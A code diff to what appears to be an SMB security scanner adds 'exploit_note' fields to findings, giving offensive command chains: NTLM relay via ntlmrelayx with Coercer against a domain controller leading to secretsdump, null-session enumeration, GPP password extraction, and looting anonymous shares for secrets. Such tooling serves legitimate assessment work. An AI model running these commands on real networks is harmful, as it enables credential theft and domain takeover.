@@ -505,7 +505,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "communications (always)' too — the client-side flag is what stops "
                     "reflection-relay variants that target the initiator side of the "
                     "SMB conversation.",
-                    ["CWE-287", "CWE-319"], kind="smb_signing_not_required"))
+                    ["CWE-287", "CWE-319"], kind="smb_signing_not_required",
+                    exploit_note=(
+                        "impacket-ntlmrelayx.py -t smb://<ip> -smb2support -socks & then "
+                        "Coercer coerce -u <lowpriv> -p <pass> -t <victim-dc> -l <your-ip>. "
+                        "On success socks proxies psexec/secretsdump through the relay."),
+                    depth_tier="t1"))
             info = pr.get("ntlm_info") if pr else None
             if info:
                 bits = []
@@ -538,7 +543,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "(Kerberos-only) where feasible. On dual-stack Windows, "
                         "'Restrict NTLM: Outgoing NTLM traffic to remote servers' "
                         "and the corresponding audit policies help scope exposure.",
-                        ["CWE-200"], kind="smb_ntlm_info_disclosure"))
+                        ["CWE-200"], kind="smb_ntlm_info_disclosure",
+                        exploit_note=(
+                            "nxc smb <ip> - the banner prints the same fields; then feed "
+                            "dns_domain into kerberos, and os_version into a CVE map "
+                            "(searchsploit windows <build>)."),
+                        depth_tier="t1"))
     return out
 
 
@@ -856,7 +866,12 @@ def null_session_findings(ip: str, port: int, session: dict) -> list[dict]:
             "nxc smb <ip> -u '' -p '' --shares --users --pass-pol",
             "Restrict anonymous access: RestrictNullSessManagement, "
             "RestrictAnonymous=1; Samba 'restrict anonymous = 2'.",
-            ["CWE-306", "CWE-200"], kind="null_session"))
+            ["CWE-306", "CWE-200"], kind="null_session",
+            exploit_note=(
+                "enum4linux-ng -A <ip>; then rpcclient -U '' -N <ip> and run: "
+                "lsaenumsid, lookupnames, samrdump. For GPP: nxc smb <ip> -u '' "
+                "-p '' -M gpp_password."),
+            depth_tier="t2"))
     # Non-admin readable shares reachable anonymously.
     readable = [s for s in shares if "READ" in (s.get("perms") or "").upper()
                 and s.get("name", "").upper() not in ("IPC$", "PRINT$")]
@@ -868,7 +883,12 @@ def null_session_findings(ip: str, port: int, session: dict) -> list[dict]:
             "hold scripts, backups and configs with embedded secrets.",
             "smbclient", "smbclient //<ip>/<share> -N -c 'recurse; ls'",
             "Remove anonymous READ from non-public shares; review share + NTFS ACLs.",
-            ["CWE-200", "CWE-306"], kind="readable_share"))
+            ["CWE-200", "CWE-306"], kind="readable_share",
+            exploit_note=(
+                "smbclient //<ip>/<share> -N -c 'recurse; ls'; then smbget -R "
+                "smb://<ip>/<share>. Grep for password, cpassword, connectionstring. "
+                "gpp-decrypt any cpassword=... hits."),
+            depth_tier="t2"))
     return out
 
 
